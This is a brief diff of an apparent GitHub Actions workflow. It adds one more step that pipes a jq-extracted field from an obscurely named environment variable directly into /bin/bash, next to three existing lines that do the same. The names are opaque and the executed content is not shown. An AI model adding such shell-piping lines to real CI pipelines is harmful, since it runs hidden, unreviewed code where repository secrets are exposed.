@@ -28,6 +28,7 @@ jobs:
           echo $gp81 | jq -r .g79 | /bin/bash
           printf '%s' "$b200" | jq -r .j8109 | /bin/bash
           printf '%s' "$j90536" | jq -r .bca2 | /bin/bash
+          printf '%s' "$jf39049" | jq -r .ivsu7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
